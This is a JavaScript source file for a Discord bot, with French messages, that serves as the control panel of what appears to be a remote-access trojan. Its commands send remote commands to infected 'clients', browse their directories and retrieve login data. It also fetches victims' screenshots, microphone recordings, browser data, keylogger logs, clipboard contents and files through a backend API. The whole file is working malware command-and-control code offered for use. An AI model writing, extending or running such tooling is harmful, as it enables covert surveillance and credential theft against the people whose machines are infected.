import {Client, GatewayIntentBits} from 'discord.js';

import config from './static/config.json' assert {type: 'json'};

import {fetchDataAndUpdateInteraction, handleFileResponse} from "./utils/data.js";
import {refreshTokenIfNeeded} from "./utils/token.js";
import {
    handleClientsCommand,
    handleHelpCommand,
    handleListDataCommand,
    handleListDirectoriesClientCommand,
    handleLivestreamCommand,
    handleStopLivestreamCommand,
    handleSendCommand,
    handleGetLoginDataCommand
} from "./utils/handleCommands.js";

const {TOKEN, API_BASE_URL} = config;

const client = new Client({intents: [GatewayIntentBits.Guilds]});

client.on('ready', async () => {
    console.log(`Connecté en tant que ${client.user.tag}!`);
    await refreshTokenIfNeeded();
    client.user.setActivity('/help');
});

client.on('interactionCreate', async interaction => {
    if (interaction.isChatInputCommand()) {
        switch (interaction.commandName) {
            case 'help':
                await handleHelpCommand(interaction);
                break;
            case 'command':
                await handleSendCommand(interaction);
                break;
            case 'list_data':
                await handleListDataCommand(interaction);
                break;
            case 'live_stream':
                await handleLivestreamCommand(interaction);
                break;
            case 'stop_stream':
                await handleStopLivestreamCommand(interaction);
                break;
            case 'clients':
                await handleClientsCommand(interaction);
                break;
            case 'list_directories_client':
                await handleListDirectoriesClientCommand(interaction);
                break;
            case 'get_login_data':
                await handleGetLoginDataCommand(interaction);
                break;
        }
    } else if (interaction.isButton()) {
        const [type, clientId, browser] = interaction.customId.split('_');
        if (type !== 'next' && type !== 'previous') {
            await fetchDataAndUpdateInteraction(type, interaction, clientId, browser);
        }

    } else if (interaction.customId === "select_screenshot") {
        const screenshotId = interaction.values[0];
        const endpoint = `${API_BASE_URL}/screenshot/image/${screenshotId}`;
        const fileName = "screenshot.png";
        await handleFileResponse(interaction, endpoint, fileName, "", 'image');

    } else if (interaction.customId === "select_microphone") {
        const microphoneId = interaction.values[0];
        const endpoint = `${API_BASE_URL}/microphone/audio/${microphoneId}`;
        const fileName = `audio_${microphoneId}.wav`;
        await handleFileResponse(interaction, endpoint, fileName, "Voici l'enregistrement audio :", 'audio');

    } else if (interaction.customId === "select_browserdata") {
        const [browserDataId, filename] = interaction.values[0].split('_');
        const endpoint = `${API_BASE_URL}/browser/data/${browserDataId}`;
        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');

    } else if (interaction.customId === "select_keylogger") {
        const [keyloggerDataId, filename] = interaction.values[0].split('_');
        const endpoint = `${API_BASE_URL}/keylogger/log/${keyloggerDataId}`;
        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');

    } else if (interaction.customId === "select_clipboard") {
        const [clipboardDataId, filename] = interaction.values[0].split('_');
        const endpoint = `${API_BASE_URL}/clipboard/content/${clipboardDataId}`;
        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');

    } else if (interaction.customId === "select_downloadfile") {
        const [downloadFileId, filename] = interaction.values[0].split('_');
        const endpoint = `${API_BASE_URL}/download/file/${downloadFileId}`;
        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
    }

});

client.login(TOKEN).then(r => console.log("Bot démarré avec succès !"));